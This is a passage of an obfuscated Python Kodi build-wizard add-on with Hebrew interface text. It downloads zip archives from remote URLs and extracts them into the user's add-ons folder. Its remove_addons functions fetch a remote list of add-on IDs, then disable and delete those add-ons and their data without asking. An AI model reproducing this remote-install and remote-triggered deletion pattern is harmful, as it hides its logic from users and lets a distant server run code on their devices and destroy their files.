			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OOOO0O000O0O0OOOO ),xbmc .LOGNOTICE )#line:5127
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5128
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5129
def checkidupdate ():#line:5135
				wiz .setS ("notedismiss","true")#line:5137
				OOO00OO0O000O0O00 =wiz .workingURL (NOTIFICATION )#line:5138
				OO00OOO00OO000O0O =" Kodi Premium"#line:5140
				OO00O000OO0O0OOOO =wiz .checkBuild (OO00OOO00OO000O0O ,'gui')#line:5141
				O0O00OO0000OO0000 =OO00OOO00OO000O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5142
				if not wiz .workingURL (OO00O000OO0O0OOOO )==True :return #line:5143
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5144
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO00OOO00OO000O0O ),'','אנא המתן')#line:5145
				OOOO00O00O0O0000O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0O00OO0000OO0000 )#line:5146
				try :os .remove (OOOO00O00O0O0000O )#line:5147
				except :pass #line:5148
				logging .warning (OO00O000OO0O0OOOO )#line:5149
				if 'google'in OO00O000OO0O0OOOO :#line:5150
				   O000OOO0OO0OOO000 =googledrive_download (OO00O000OO0O0OOOO ,OOOO00O00O0O0000O ,DP ,wiz .checkBuild (OO00OOO00OO000O0O ,'filesize'))#line:5151
				else :#line:5154
				  downloader .download (OO00O000OO0O0OOOO ,OOOO00O00O0O0000O ,DP )#line:5155
				xbmc .sleep (100 )#line:5156
				O0OOOOO0O000O000O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00OOO00OO000O0O )#line:5157
				DP .update (0 ,O0OOOOO0O000O000O ,'','אנא המתן')#line:5158
				extract .all (OOOO00O00O0O0000O ,HOME ,DP ,title =O0OOOOO0O000O000O )#line:5159
				DP .close ()#line:5160
				wiz .defaultSkin ()#line:5161
				wiz .lookandFeelData ('save')#line:5162
				if KODIV >=18 :#line:5163
					skindialogsettind18 ()#line:5164
				if INSTALLMETHOD ==1 :OOOOOOOOO00O0O00O =1 #line:5167
				elif INSTALLMETHOD ==2 :OOOOOOOOO00O0O00O =0 #line:5168
				else :DP .close ()#line:5169
def gaiaserenaddon ():#line:5171
  O0OO0O00O0O00000O =(ADDON .getSetting ("gaiaseren"))#line:5172
  OOOOOO0O0O0OOOO00 =(ADDON .getSetting ("auto_rd"))#line:5173
  if O0OO0O00O0O00000O =='true'and OOOOOO0O0O0OOOO00 =='true':#line:5174
    O000O00O0O00OO0O0 =(NEWFASTUPDATE )#line:5175
    OO0000OOOOOOOOO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5176
    OOO0O00OO0000O000 =xbmcgui .DialogProgress ()#line:5177
    OOO0O00OO0000O000 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5178
    OOOOOOOOO000OOO00 =os .path .join (PACKAGES ,'isr.zip')#line:5179
    O0OOOOO0OO0O000OO =urllib2 .Request (O000O00O0O00OO0O0 )#line:5180
    OO0OO0OO00OOO00O0 =urllib2 .urlopen (O0OOOOO0OO0O000OO )#line:5181
    OOO000O0OOO0OO0OO =xbmcgui .DialogProgress ()#line:5183
    OOO000O0OOO0OO0OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5184
    OOO000O0OOO0OO0OO .update (0 )#line:5185
    OOO0OOOOO0O0000OO =open (OOOOOOOOO000OOO00 ,'wb')#line:5187
    try :#line:5189
      O00OOOOOO0OOOOO00 =OO0OO0OO00OOO00O0 .info ().getheader ('Content-Length').strip ()#line:5190
      OOOO000OO00O0O00O =True #line:5191
    except AttributeError :#line:5192
          OOOO000OO00O0O00O =False #line:5193
    if OOOO000OO00O0O00O :#line:5195
          O00OOOOOO0OOOOO00 =int (O00OOOOOO0OOOOO00 )#line:5196
    O00OO000O00O00O00 =0 #line:5198
    O0O0000O000O00O0O =time .time ()#line:5199
    while True :#line:5200
          O00O00OOOO00O00OO =OO0OO0OO00OOO00O0 .read (8192 )#line:5201
          if not O00O00OOOO00O00OO :#line:5202
              sys .stdout .write ('\n')#line:5203
              break #line:5204
          O00OO000O00O00O00 +=len (O00O00OOOO00O00OO )#line:5206
          OOO0OOOOO0O0000OO .write (O00O00OOOO00O00OO )#line:5207
          if not OOOO000OO00O0O00O :#line:5209
              O00OOOOOO0OOOOO00 =O00OO000O00O00O00 #line:5210
          if OOO000O0OOO0OO0OO .iscanceled ():#line:5211
             OOO000O0OOO0OO0OO .close ()#line:5212
             try :#line:5213
              os .remove (OOOOOOOOO000OOO00 )#line:5214
             except :#line:5215
              pass #line:5216
             break #line:5217
          O0OOOOO0OOOO0000O =float (O00OO000O00O00O00 )/O00OOOOOO0OOOOO00 #line:5218
          O0OOOOO0OOOO0000O =round (O0OOOOO0OOOO0000O *100 ,2 )#line:5219
          O0OO0O0O0O00000OO =O00OO000O00O00O00 /(1024 *1024 )#line:5220
          O0OOOO000000000O0 =O00OOOOOO0OOOOO00 /(1024 *1024 )#line:5221
          OO0O00OOO000O000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO0O0O0O00000OO ,'teal',O0OOOO000000000O0 )#line:5222
          if (time .time ()-O0O0000O000O00O0O )>0 :#line:5223
            OOOOOO00O0O00O000 =O00OO000O00O00O00 /(time .time ()-O0O0000O000O00O0O )#line:5224
            OOOOOO00O0O00O000 =OOOOOO00O0O00O000 /1024 #line:5225
          else :#line:5226
           OOOOOO00O0O00O000 =0 #line:5227
          OO00OOOO0O000OO0O ='KB'#line:5228
          if OOOOOO00O0O00O000 >=1024 :#line:5229
             OOOOOO00O0O00O000 =OOOOOO00O0O00O000 /1024 #line:5230
             OO00OOOO0O000OO0O ='MB'#line:5231
          if OOOOOO00O0O00O000 >0 and not O0OOOOO0OOOO0000O ==100 :#line:5232
              OO0O0OO0O0O0OOOOO =(O00OOOOOO0OOOOO00 -O00OO000O00O00O00 )/OOOOOO00O0O00O000 #line:5233
          else :#line:5234
              OO0O0OO0O0O0OOOOO =0 #line:5235
          OOOOO0OOO0OOOOOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOOO00O0O00O000 ,OO00OOOO0O000OO0O )#line:5236
          OOO000O0OOO0OO0OO .update (int (O0OOOOO0OOOO0000O ),OO0O00OOO000O000O ,OOOOO0OOO0OOOOOO0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5238
    O000O0OO000000OOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5241
    OOO0OOOOO0O0000OO .close ()#line:5244
    extract .all (OOOOOOOOO000OOO00 ,O000O0OO000000OOO ,OOO000O0OOO0OO0OO )#line:5245
    try :#line:5249
      os .remove (OOOOOOOOO000OOO00 )#line:5250
    except :#line:5251
      pass #line:5252
def iptvsimpldownpc ():#line:5253
    O0O00O0OO000O0000 =(IPTVSIMPL18PC )#line:5255
    OOO0O0OOO0O0O0O00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5256
    OOO000OO0O0OOO00O =xbmcgui .DialogProgress ()#line:5257
    OOO000OO0O0OOO00O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5258
    O0O0000OOOOO00O00 =os .path .join (PACKAGES ,'isr.zip')#line:5259
    OOOOOOOOOOO000000 =urllib2 .Request (O0O00O0OO000O0000 )#line:5260
    O0OOO0OOOOOO0O00O =urllib2 .urlopen (OOOOOOOOOOO000000 )#line:5261
    OOO00O0OOOO00O0OO =xbmcgui .DialogProgress ()#line:5263
    OOO00O0OOOO00O0OO .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5264
    OOO00O0OOOO00O0OO .update (0 )#line:5265
    O000OOOOOO00000OO =open (O0O0000OOOOO00O00 ,'wb')#line:5267
    try :#line:5269
      O0O0O0000OO000OOO =O0OOO0OOOOOO0O00O .info ().getheader ('Content-Length').strip ()#line:5270
      O00000OOOO0O0000O =True #line:5271
    except AttributeError :#line:5272
          O00000OOOO0O0000O =False #line:5273
    if O00000OOOO0O0000O :#line:5275
          O0O0O0000OO000OOO =int (O0O0O0000OO000OOO )#line:5276
    O00OO0O0OO000000O =0 #line:5278
    OO00O000O0OOOO000 =time .time ()#line:5279
    while True :#line:5280
          O0OOO0OOO0OO0OO00 =O0OOO0OOOOOO0O00O .read (8192 )#line:5281
          if not O0OOO0OOO0OO0OO00 :#line:5282
              sys .stdout .write ('\n')#line:5283
              break #line:5284
          O00OO0O0OO000000O +=len (O0OOO0OOO0OO0OO00 )#line:5286
          O000OOOOOO00000OO .write (O0OOO0OOO0OO0OO00 )#line:5287
          if not O00000OOOO0O0000O :#line:5289
              O0O0O0000OO000OOO =O00OO0O0OO000000O #line:5290
          if OOO00O0OOOO00O0OO .iscanceled ():#line:5291
             OOO00O0OOOO00O0OO .close ()#line:5292
             try :#line:5293
              os .remove (O0O0000OOOOO00O00 )#line:5294
             except :#line:5295
              pass #line:5296
             break #line:5297
          OOO0OOOO00OO0OOOO =float (O00OO0O0OO000000O )/O0O0O0000OO000OOO #line:5298
          OOO0OOOO00OO0OOOO =round (OOO0OOOO00OO0OOOO *100 ,2 )#line:5299
          OO00O0OO00000OOO0 =O00OO0O0OO000000O /(1024 *1024 )#line:5300
          O0O000O00000OOO00 =O0O0O0000OO000OOO /(1024 *1024 )#line:5301
          O0O00OOO0OO00O00O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00O0OO00000OOO0 ,'teal',O0O000O00000OOO00 )#line:5302
          if (time .time ()-OO00O000O0OOOO000 )>0 :#line:5303
            OO0000O00OO00OO00 =O00OO0O0OO000000O /(time .time ()-OO00O000O0OOOO000 )#line:5304
            OO0000O00OO00OO00 =OO0000O00OO00OO00 /1024 #line:5305
          else :#line:5306
           OO0000O00OO00OO00 =0 #line:5307
          OO0O0000000O000OO ='KB'#line:5308
          if OO0000O00OO00OO00 >=1024 :#line:5309
             OO0000O00OO00OO00 =OO0000O00OO00OO00 /1024 #line:5310
             OO0O0000000O000OO ='MB'#line:5311
          if OO0000O00OO00OO00 >0 and not OOO0OOOO00OO0OOOO ==100 :#line:5312
              OO0OO0O0OOO0OO0O0 =(O0O0O0000OO000OOO -O00OO0O0OO000000O )/OO0000O00OO00OO00 #line:5313
          else :#line:5314
              OO0OO0O0OOO0OO0O0 =0 #line:5315
          O0OOOO0O00O0O0O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO0000O00OO00OO00 ,OO0O0000000O000OO )#line:5316
          OOO00O0OOOO00O0OO .update (int (OOO0OOOO00OO0OOOO ),O0O00OOO0OO00O00O ,O0OOOO0O00O0O0O0O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5318
    O00OOOO0O0000OOOO =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5321
    O000OOOOOO00000OO .close ()#line:5324
    extract .all (O0O0000OOOOO00O00 ,O00OOOO0O0000OOOO ,OOO00O0OOOO00O0OO )#line:5325
    try :#line:5329
      os .remove (O0O0000OOOOO00O00 )#line:5330
    except :#line:5331
      pass #line:5332
def iptvsimpldown ():#line:5333
    OO0OO0000O00000OO =(IPTV18 )#line:5335
    O000OO0OO0OO0OOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5336
    OO0O0O0O0O00O0O0O =xbmcgui .DialogProgress ()#line:5337
    OO0O0O0O0O00O0O0O .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5338
    OOO0OO0000O0O0OOO =os .path .join (PACKAGES ,'isr.zip')#line:5339
    O0O0OOO00OOO00O00 =urllib2 .Request (OO0OO0000O00000OO )#line:5340
    O000OOO000000OO00 =urllib2 .urlopen (O0O0OOO00OOO00O00 )#line:5341
    OOOO0OOOO0OOOOOO0 =xbmcgui .DialogProgress ()#line:5343
    OOOO0OOOO0OOOOOO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5344
    OOOO0OOOO0OOOOOO0 .update (0 )#line:5345
    OO00OOOO0OO0000OO =open (OOO0OO0000O0O0OOO ,'wb')#line:5347
    try :#line:5349
      O0000O00O00000000 =O000OOO000000OO00 .info ().getheader ('Content-Length').strip ()#line:5350
      OOO00O0O0000000OO =True #line:5351
    except AttributeError :#line:5352
          OOO00O0O0000000OO =False #line:5353
    if OOO00O0O0000000OO :#line:5355
          O0000O00O00000000 =int (O0000O00O00000000 )#line:5356
    O00O0O00OO00OOOOO =0 #line:5358
    OOOO00O000000O0OO =time .time ()#line:5359
    while True :#line:5360
          OO00OO0O000O0000O =O000OOO000000OO00 .read (8192 )#line:5361
          if not OO00OO0O000O0000O :#line:5362
              sys .stdout .write ('\n')#line:5363
              break #line:5364
          O00O0O00OO00OOOOO +=len (OO00OO0O000O0000O )#line:5366
          OO00OOOO0OO0000OO .write (OO00OO0O000O0000O )#line:5367
          if not OOO00O0O0000000OO :#line:5369
              O0000O00O00000000 =O00O0O00OO00OOOOO #line:5370
          if OOOO0OOOO0OOOOOO0 .iscanceled ():#line:5371
             OOOO0OOOO0OOOOOO0 .close ()#line:5372
             try :#line:5373
              os .remove (OOO0OO0000O0O0OOO )#line:5374
             except :#line:5375
              pass #line:5376
             break #line:5377
          OO00O00000O0OO000 =float (O00O0O00OO00OOOOO )/O0000O00O00000000 #line:5378
          OO00O00000O0OO000 =round (OO00O00000O0OO000 *100 ,2 )#line:5379
          OOOOOOOOO000O0OOO =O00O0O00OO00OOOOO /(1024 *1024 )#line:5380
          O00O0000OOO000OO0 =O0000O00O00000000 /(1024 *1024 )#line:5381
          OOOOOOO0OOO00O0OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOOOOOO000O0OOO ,'teal',O00O0000OOO000OO0 )#line:5382
          if (time .time ()-OOOO00O000000O0OO )>0 :#line:5383
            OOO0OO000O0OOOOOO =O00O0O00OO00OOOOO /(time .time ()-OOOO00O000000O0OO )#line:5384
            OOO0OO000O0OOOOOO =OOO0OO000O0OOOOOO /1024 #line:5385
          else :#line:5386
           OOO0OO000O0OOOOOO =0 #line:5387
          O00OOO000O0OO00OO ='KB'#line:5388
          if OOO0OO000O0OOOOOO >=1024 :#line:5389
             OOO0OO000O0OOOOOO =OOO0OO000O0OOOOOO /1024 #line:5390
             O00OOO000O0OO00OO ='MB'#line:5391
          if OOO0OO000O0OOOOOO >0 and not OO00O00000O0OO000 ==100 :#line:5392
              O00O0O00O0OO0OO0O =(O0000O00O00000000 -O00O0O00OO00OOOOO )/OOO0OO000O0OOOOOO #line:5393
          else :#line:5394
              O00O0O00O0OO0OO0O =0 #line:5395
          OOO0O0O0OO0O00O00 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0OO000O0OOOOOO ,O00OOO000O0OO00OO )#line:5396
          OOOO0OOOO0OOOOOO0 .update (int (OO00O00000O0OO000 ),OOOOOOO0OOO00O0OO ,OOO0O0O0OO0O00O00 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5398
    O0OO0000OOOO0O00O =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5401
    OO00OOOO0OO0000OO .close ()#line:5404
    extract .all (OOO0OO0000O0O0OOO ,O0OO0000OOOO0O00O ,OOOO0OOOO0OOOOOO0 )#line:5405
    try :#line:5409
      os .remove (OOO0OO0000O0O0OOO )#line:5410
    except :#line:5411
      pass #line:5412
def testnotify ():#line:5413
	OOO00O0O000O000OO =wiz .workingURL (NOTIFICATION )#line:5414
	if OOO00O0O000O000OO ==True :#line:5415
		try :#line:5416
			OOO0O0O0000O0OOOO ,OO00O000O00O000O0 =wiz .splitNotify (NOTIFICATION )#line:5417
			if OOO0O0O0000O0OOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5418
			if STARTP2 ()=='ok':#line:5419
				notify .notification (OO00O000O00O000O0 ,True )#line:5420
		except Exception as O00OOO00000000000 :#line:5421
			wiz .log ("Error on Notifications Window: %s"%str (O00OOO00000000000 ),xbmc .LOGERROR )#line:5422
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5423
def testnotify2 ():#line:5424
	OOO00OOO0O0O00000 =wiz .workingURL (NOTIFICATION2 )#line:5425
	if OOO00OOO0O0O00000 ==True :#line:5426
		try :#line:5427
			OO0O000OOO00O00O0 ,O0OO00O00O00O00O0 =wiz .splitNotify (NOTIFICATION2 )#line:5428
			if OO0O000OOO00O00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5429
			if STARTP2 ()=='ok':#line:5430
				notify .notification2 (O0OO00O00O00O00O0 ,True )#line:5431
		except Exception as O00000O0OO0OO00OO :#line:5432
			wiz .log ("Error on Notifications Window: %s"%str (O00000O0OO0OO00OO ),xbmc .LOGERROR )#line:5433
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5434
def testnotify3 ():#line:5435
	O0O00OOOO00OOOOOO =wiz .workingURL (NOTIFICATION3 )#line:5436
	if O0O00OOOO00OOOOOO ==True :#line:5437
		try :#line:5438
			O0000OO0O0000000O ,O000O00OOO0OOO00O =wiz .splitNotify (NOTIFICATION3 )#line:5439
			if O0000OO0O0000000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5440
			if STARTP2 ()=='ok':#line:5441
				notify .notification3 (O000O00OOO0OOO00O ,True )#line:5442
		except Exception as O00OOOOOOO000OOOO :#line:5443
			wiz .log ("Error on Notifications Window: %s"%str (O00OOOOOOO000OOOO ),xbmc .LOGERROR )#line:5444
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5445
def servicemanual ():#line:5446
	OO00OOO0O0O0OOO00 =wiz .workingURL (HELPINFO )#line:5447
	if OO00OOO0O0O0OOO00 ==True :#line:5448
		try :#line:5449
			O0OOOO0O00000000O ,OO00000OOO00O0O0O =wiz .splitNotify (HELPINFO )#line:5450
			if O0OOOO0O00000000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5451
			notify .helpinfo (OO00000OOO00O0O0O ,True )#line:5452
		except Exception as O00O0O00OO00OOOO0 :#line:5453
			wiz .log ("Error on Notifications Window: %s"%str (O00O0O00OO00OOOO0 ),xbmc .LOGERROR )#line:5454
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5455
def testupdate ():#line:5457
	if BUILDNAME =="":#line:5458
		notify .updateWindow ()#line:5459
	else :#line:5460
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5461
def testfirst ():#line:5463
	notify .firstRun ()#line:5464
def testfirstRun ():#line:5466
	notify .firstRunSettings ()#line:5467
def fastinstall ():#line:5470
	notify .firstRuninstall ()#line:5471
def addDir (OOOOO00OOO00O000O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5478
	O0O0OO0OO00OOO00O =sys .argv [0 ]#line:5479
	if not mode ==None :O0O0OO0OO00OOO00O +="?mode=%s"%urllib .quote_plus (mode )#line:5480
	if not name ==None :O0O0OO0OO00OOO00O +="&name="+urllib .quote_plus (name )#line:5481
	if not url ==None :O0O0OO0OO00OOO00O +="&url="+urllib .quote_plus (url )#line:5482
	O0O0OOO0O000OOOO0 =True #line:5483
	if themeit :OOOOO00OOO00O000O =themeit %OOOOO00OOO00O000O #line:5484
	OO0OO00000OOO0O00 =xbmcgui .ListItem (OOOOO00OOO00O000O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5485
	OO0OO00000OOO0O00 .setInfo (type ="Video",infoLabels ={"Title":OOOOO00OOO00O000O ,"Plot":description })#line:5486
	OO0OO00000OOO0O00 .setProperty ("Fanart_Image",fanart )#line:5487
	if not menu ==None :OO0OO00000OOO0O00 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5488
	O0O0OOO0O000OOOO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O0OO0OO00OOO00O ,listitem =OO0OO00000OOO0O00 ,isFolder =True )#line:5489
	return O0O0OOO0O000OOOO0 #line:5490
def addFile (O0OO00O0OO0OO0OOO ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5492
	O0OOOO0000O0O0OOO =sys .argv [0 ]#line:5493
	if not mode ==None :O0OOOO0000O0O0OOO +="?mode=%s"%urllib .quote_plus (mode )#line:5494
	if not name ==None :O0OOOO0000O0O0OOO +="&name="+urllib .quote_plus (name )#line:5495
	if not url ==None :O0OOOO0000O0O0OOO +="&url="+urllib .quote_plus (url )#line:5496
	OOO0O00O0O0O0O0OO =True #line:5497
	if themeit :O0OO00O0OO0OO0OOO =themeit %O0OO00O0OO0OO0OOO #line:5498
	OO00OO0O0O0O00O0O =xbmcgui .ListItem (O0OO00O0OO0OO0OOO ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5499
	OO00OO0O0O0O00O0O .setInfo (type ="Video",infoLabels ={"Title":O0OO00O0OO0OO0OOO ,"Plot":description })#line:5500
	OO00OO0O0O0O00O0O .setProperty ("Fanart_Image",fanart )#line:5501
	if not menu ==None :OO00OO0O0O0O00O0O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5502
	OOO0O00O0O0O0O0OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OOOO0000O0O0OOO ,listitem =OO00OO0O0O0O00O0O ,isFolder =False )#line:5503
	return OOO0O00O0O0O0O0OO #line:5504
def get_params ():#line:5506
	OOO000000O00OOO00 =[]#line:5507
	OOOO0OO0OOO0OO0OO =sys .argv [2 ]#line:5508
	if len (OOOO0OO0OOO0OO0OO )>=2 :#line:5509
		OOOOOOOO0000O0O0O =sys .argv [2 ]#line:5510
		O00O00OO000OO0OO0 =OOOOOOOO0000O0O0O .replace ('?','')#line:5511
		if (OOOOOOOO0000O0O0O [len (OOOOOOOO0000O0O0O )-1 ]=='/'):#line:5512
			OOOOOOOO0000O0O0O =OOOOOOOO0000O0O0O [0 :len (OOOOOOOO0000O0O0O )-2 ]#line:5513
		OOOOOOO00OOOOOO0O =O00O00OO000OO0OO0 .split ('&')#line:5514
		OOO000000O00OOO00 ={}#line:5515
		for O00OOO0O0O00OOO00 in range (len (OOOOOOO00OOOOOO0O )):#line:5516
			OO000O00OO00OOO00 ={}#line:5517
			OO000O00OO00OOO00 =OOOOOOO00OOOOOO0O [O00OOO0O0O00OOO00 ].split ('=')#line:5518
			if (len (OO000O00OO00OOO00 ))==2 :#line:5519
				OOO000000O00OOO00 [OO000O00OO00OOO00 [0 ]]=OO000O00OO00OOO00 [1 ]#line:5520
		return OOO000000O00OOO00 #line:5522
def remove_addons ():#line:5524
	try :#line:5525
			import json #line:5526
			O0O0000OOOOOOOO00 =urllib2 .urlopen (remove_url ).readlines ()#line:5527
			for OO0O00O0OO0O000O0 in O0O0000OOOOOOOO00 :#line:5528
				OO0OO00OO00O0O0OO =OO0O00O0OO0O000O0 .split (':')[1 ].strip ()#line:5530
				OOOOOO000000000OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OO0OO00OO00O0O0OO ,'false')#line:5531
				O0O00O00O0OO00OO0 =xbmc .executeJSONRPC (OOOOOO000000000OO )#line:5532
				O0000O0O0O0OOOO00 =json .loads (O0O00O00O0OO00OO0 )#line:5533
				OO000OOO00OO0OO0O =os .path .join (addons_folder ,OO0OO00OO00O0O0OO )#line:5535
				if os .path .exists (OO000OOO00OO0OO0O ):#line:5537
					for OO0O0OO00OO0O0O00 ,O0000OO0O0OO0OOOO ,OO0000OOO0O0OOOOO in os .walk (OO000OOO00OO0OO0O ):#line:5538
						for O0000O0O00000OO00 in OO0000OOO0O0OOOOO :#line:5539
							os .unlink (os .path .join (OO0O0OO00OO0O0O00 ,O0000O0O00000OO00 ))#line:5540
						for O0OOOO0O0OO0OO00O in O0000OO0O0OO0OOOO :#line:5541
							shutil .rmtree (os .path .join (OO0O0OO00OO0O0O00 ,O0OOOO0O0OO0OO00O ))#line:5542
					os .rmdir (OO000OOO00OO0OO0O )#line:5543
			xbmc .executebuiltin ('Container.Refresh')#line:5545
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5546
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5547
	except :pass #line:5548
def remove_addons2 ():#line:5549
	try :#line:5550
			import json #line:5551
			O00OO0O0OO00OOOOO =urllib2 .urlopen (remove_url2 ).readlines ()#line:5552
			for O00O000OO0OOOO000 in O00OO0O0OO00OOOOO :#line:5553
				OO0O00OOOO00O00OO =O00O000OO0OOOO000 .split (':')[1 ].strip ()#line:5555
				OOO0OOOOOO0OO0O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OO0O00OOOO00O00OO ,'false')#line:5556
				OO0O0O0O00OOOO000 =xbmc .executeJSONRPC (OOO0OOOOOO0OO0O00 )#line:5557
				OO000OOO00OO00O0O =json .loads (OO0O0O0O00OOOO000 )#line:5558
				OOOO0OO00OO0O000O =os .path .join (user_folder ,OO0O00OOOO00O00OO )#line:5560
				if os .path .exists (OOOO0OO00OO0O000O ):#line:5562
					for OOO0O0O00OO0O0OOO ,OO000O0O0O00OO0OO ,O0O000O0000OOO0OO in os .walk (OOOO0OO00OO0O000O ):#line:5563
						for OOO00000OO00OO0O0 in O0O000O0000OOO0OO :#line:5564
							os .unlink (os .path .join (OOO0O0O00OO0O0OOO ,OOO00000OO00OO0O0 ))#line:5565
						for OO00O0OOOOO0O00O0 in OO000O0O0O00OO0OO :#line:5566
							shutil .rmtree (os .path .join (OOO0O0O00OO0O0OOO ,OO00O0OOOOO0O00O0 ))#line:5567
					os .rmdir (OOOO0OO00OO0O000O )#line:5568
	except :pass #line:5570
params =get_params ()#line:5571
url =None #line:5572
name =None #line:5573
mode =None #line:5574
try :mode =urllib .unquote_plus (params ["mode"])#line:5576
except :pass #line:5577
try :name =urllib .unquote_plus (params ["name"])#line:5578
except :pass #line:5579
try :url =urllib .unquote_plus (params ["url"])#line:5580
except :pass #line:5581
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5583
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5584
def setView (OOOOO0OO00000OO00 ,OO000O0OOO00O0OO0 ):#line:5585
	if wiz .getS ('auto-view')=='true':#line:5586
		OOOOO0000000OOO00 =wiz .getS (OO000O0OOO00O0OO0 )#line:5587
		if OOOOO0000000OOO00 =='50'and KODIV >=17 and SKIN =='skin.estuary':OOOOO0000000OOO00 ='55'#line:5588
		if OOOOO0000000OOO00 =='500'and KODIV >=17 and SKIN =='skin.estuary':OOOOO0000000OOO00 ='50'#line:5589
		wiz .ebi ("Container.SetViewMode(%s)"%OOOOO0000000OOO00 )#line:5590
if mode ==None :index ()#line:5592
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5594
elif mode =='builds':buildMenu ()#line:5595
elif mode =='viewbuild':viewBuild (name )#line:5596
elif mode =='buildinfo':buildInfo (name )#line:5597
elif mode =='buildpreview':buildVideo (name )#line:5598
elif mode =='install':buildWizard (name ,url )#line:5599
